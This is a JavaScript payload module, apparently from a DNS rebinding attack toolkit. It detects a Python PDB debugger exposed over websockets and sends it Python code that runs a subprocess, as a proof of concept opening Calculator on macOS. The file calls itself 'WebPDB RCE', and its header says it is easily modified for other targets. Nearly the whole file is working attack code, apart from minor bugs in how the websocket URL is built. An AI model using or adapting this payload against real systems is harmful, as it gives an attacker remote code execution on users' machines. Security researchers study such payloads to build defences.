/**
This is a generic payload to exploit the Python `PDB` debugger exposed via websockets.
It opens the "Calculator" application on macOS. 
The payload can be easily modified to target different OSes or implementations.
The TCP port varies.
**/

const WebPdb = () => {

    // Invoked after DNS rebinding has been performed
    function attack(headers, cookie, body) {
        let wsURL = "ws://" + location.hostname + ":" + location.port === 80 ? "80" : location.port +
            "/wspdb";

        const ws = new WebSocket(url);
        ws.onopen = () => ws.send(
            "import subprocess; subprocess.call([\"/usr/bin/open\", \"-W\", \"-n\", \"-a\", \"/Applications/Calculator.app\"])"
        );
        ws.onmessage = ({
            data
        }) => {
            console.log(data);
            ws.close();
        };
        ws.onerror = err => console.error('failed to connect');
    }

    // Invoked to determine whether the rebinded service
    // is the one targetted by this payload. Must return true or false.
    async function isService(headers, cookie, body) {
        let detected = false;

        if (body === null) {
            return detected;
        }

        if (body.includes('PDB Console') === true) {
            detected = true;
        }
        return detected;
    }


    return {
        attack,
        isService
    }
}

// Registry value and manager-config.json value must match
Registry["WebPDB RCE"] = WebPdb();



